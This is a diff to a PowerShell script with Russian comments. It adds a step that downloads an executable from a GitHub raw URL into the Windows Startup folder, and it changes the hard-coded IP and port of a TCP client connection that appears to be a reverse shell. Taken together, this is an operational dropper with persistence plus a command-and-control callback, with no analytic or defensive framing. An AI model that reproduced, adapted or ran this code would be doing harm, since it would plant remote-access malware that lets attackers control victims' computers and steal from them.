@@ -1,5 +1,17 @@
-$ip = "195.133.55.162"
-$port = 4433
+$url = "https://raw.githubusercontent.com/xzj4/1/refs/heads/main/carnsvc.exe"
+$destPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\carnsvc.exe"
+
+# 1. Блок скачивания файла
+try {
+    if (-not (Test-Path $destPath)) {
+        # Используем -ErrorAction Stop, чтобы поймать ошибку в блоке catch
+        Invoke-WebRequest -Uri $url -OutFile $destPath -ErrorAction Stop
+    }
+} catch {
+    Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
+}
+$ip = "178.170.220.14"
+$port = 9090
 
 try {
     $t = New-Object System.Net.Sockets.TCPClient($ip, $port)
